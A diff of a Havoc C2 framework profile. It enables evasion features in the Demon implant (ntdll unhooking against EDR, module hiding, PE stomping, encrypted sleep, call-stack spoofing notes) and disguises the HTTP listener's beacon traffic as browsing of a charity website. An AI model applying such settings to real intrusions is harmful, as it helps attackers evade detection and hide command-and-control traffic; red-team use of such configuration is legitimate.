@@ -47,35 +47,35 @@ Demon {
     SleepJmpGadget = "jmp rax"
 
     # Re-select a random gadget address each sleep cycle (Ekko/Zilean only, ignored by Foliage)
-    RandGadget = false
+    RandGadget = true
 
     # Overwrite loaded ntdll .text with a clean copy from \KnownDlls at startup — removes EDR inline hooks
-    UnhookNtdll = false
+    UnhookNtdll = true
 
     # Unlink dynamically loaded modules from PEB InLoadOrderModuleList, InMemoryOrderModuleList, InInitializationOrderModuleList
-    HideModules = false
+    HideModules = true
 
     # Stomp PE header region during default sleep -- opt-in; leave false for injected payloads (ISS-037)
-    PeStomp = false
+    PeStomp = true
 
     # Sleep obfuscation cipher: "RC4" (default, 16-byte key) or "ChaCha20" (32-byte key + 12-byte nonce)
     # This setting is authoritative -- the operator UI allows override per payload build.
-    SleepCipher = "RC4"
+    SleepCipher = "ChaCha20"
 
     # Enable verbose debug logging in the Demon agent at startup
     Verbose = false
 
     # Enable VEH (vectored exception handling) for BOF/object file loading (CoffeeLoader)
-    CoffeeVeh = false
+    CoffeeVeh = true
 
     # Enable threaded execution for BOF/object files (CoffeeLoader)
-    CoffeeThreaded = false
+    CoffeeThreaded = true
 
     # HVC-046: Base delay (seconds) between injection stages (alloc -> protect -> execute); 0 = disabled
-    ExecDelay = 0
+    ExecDelay = 10
 
     # HVC-046: Jitter percentage applied to ExecDelay (0-100); 0 = no jitter
-    ExecDelayJitter = 0
+    ExecDelayJitter = 25
 
     # Optional: custom thread start address for sleep obfuscation
     # When omitted the agent uses RtlUserThreadStart (the safe default)
@@ -92,6 +92,23 @@ Demon {
     #     Function = "GetModuleHandleA"
     #     Offset   = 0
     # }
+
+    # HVC-047: injection thread callstack spoofing (Tier 2 SMR)
+    # When StackDuplication=true, these configure TEB.Win32StartAddress and the
+    # fake return-address chain written to the suspended thread's initial stack.
+    # Defaults (when omitted) mimic a Windows thread-pool worker thread.
+    # Defaults mimic a standard CreateThread-spawned thread (all functions exported):
+    #   TEB.Win32StartAddress = kernel32!BaseThreadInitThunk
+    #   Stack: BaseThreadInitThunk+0x14 / RtlUserThreadStart+0x21 / NULL (walk stops)
+    # StackSpoofStartAddr {
+    #     Library  = "kernel32.dll"
+    #     Function = "BaseThreadInitThunk"
+    #     Offset   = 0
+    # }
+    # StackSpoofFrame0 { Library = "kernel32.dll"; Function = "BaseThreadInitThunk"; Offset = 20  }
+    # StackSpoofFrame1 { Library = "ntdll.dll";    Function = "RtlUserThreadStart";  Offset = 33  }
+    # StackSpoofFrame2 { }  # empty = NULL, stack walk terminates here
+    # StackSpoofFrame3 { }  # empty = NULL
 
     # Accepted: "None (LdrLoadDll)", "RtlRegisterWait", "RtlCreateTimer", "RtlQueueWorkItem"
     ProxyLoading = "RtlQueueWorkItem"
@@ -137,26 +154,45 @@ Listeners {
         	UserAgent    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
 
 		Uris = [
-            		"/js/jquery3.8.js",
-            		"/index.action",
-            		"/query/fi/profile.action",
-            		"/a/o/integration.action"
-        	]
+            "/js/libs/jquery-1.6.3.min.js",
+            "/contact-us.php",
+            "/favicon.ico",
+            "/blog/index.html",
+            "/blog/category/united-states/index.html",
+            "/blog/category/kenya/index.html",
+            "/leadership/natalie-berg.php",
+            "/sponsorships/index.html",
+            "/sponsorships/charitable-institutions.php",
+            "/mission.php",
+            "/volunteer/index.html",
+            "/projects/projects-us.php",
+            "/projects/projects-ua.php",
+            "/js/activatables.js"
+        ]
 
-        	Headers = [
-            		"Content-type: text/plain",
-        	]
+        Headers = [
+			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+			"Accept-Language: en-US,en;q=0.5",
+			"Accept-Encoding: gzip, deflate, br",
+			"Upgrade-Insecure-Requests: 1",
+			"Sec-Fetch-Dest: document",
+			"Sec-Fetch-Mode: navigate",
+			"Sec-Fetch-Site: none",
+			"Sec-Fetch-User: ?1"
+        ]
 
-        	Response {
-            		Headers = [
-                		"Content-type: text/plain",
-            		]
-        	}
-
+        Response {
+            Headers = [
+                "Server: Nginx",
+                    "ETag: 5045-607fab0c09f00-gzip",
+                    "Accept-Ranges: bytes",
+                    "Vary: Accept-Encoding",
+                ]
+            }
 	  }
 
     Smb {
         Name = "Smb"
-        PipeName = "msagent_01"
+        PipeName = "havocagent_01"
       }
 }
